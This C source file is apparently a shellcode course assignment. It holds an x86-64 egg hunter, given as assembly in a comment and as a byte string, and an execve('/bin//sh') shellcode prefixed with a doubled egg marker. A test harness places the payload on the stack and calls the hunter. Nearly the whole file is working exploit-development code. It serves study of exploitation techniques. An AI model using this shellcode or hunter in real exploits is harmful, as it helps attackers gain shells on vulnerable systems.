#include<stdio.h>
#include<stdlib.h>
#include<string.h>
/*
;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.
;
;For a detailed explanation of this shellcode see my blog post:
;http://a41l4.blogspot.ca/2017/02/assignment-3.html

global _start 

section .text

_start:
	push rsp
	pop rdi
	push 0x31ff31ff ; egg is xor edi,edi xor edi,edi ; 4 bytes
	pop rax
next:
	scasd
	jnz next
	scasd
	jnz next
	jmp rdi
*/

#define EGG "\xff\x31\xff\x31"
unsigned char EggHunter[] = \
"\x54\x5f\x68"
EGG
"\x58\xaf\x75\xfd\xaf\x75\xfa\xff\xe7";

unsigned char code[] = \
EGG
EGG
"\x31\xf6\xf7\xe6\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code)-8);/* subtract the size of the EGG */
	printf("EggHunter Length:  %d\n", ((int)strlen(EggHunter)));
	/* we are putting the shellcode on the stack before the egghunter searches for it. */
	char stack[200];
	printf("Memory location of shellcode: %p\n", stack);
	strcpy(stack, code); 

 /*
    I decided to load up all the main registers to ensure that the shellcode
    still works no matter what state the registers are in.
 */
	__asm__ ("mov $0xffffffffffffffff, %rax\n"
		"push %rax\n"
		"pop %rbx\n"
		"push %rbx\n"
		"pop %rcx\n"
		"push %rcx\n"
		"pop %rdx\n"
		"push %rdx\n"
		"pop %rsi\n"
		"push %rsi\n"
		"pop %rdi\n"
		"call EggHunter\n"
		);

}
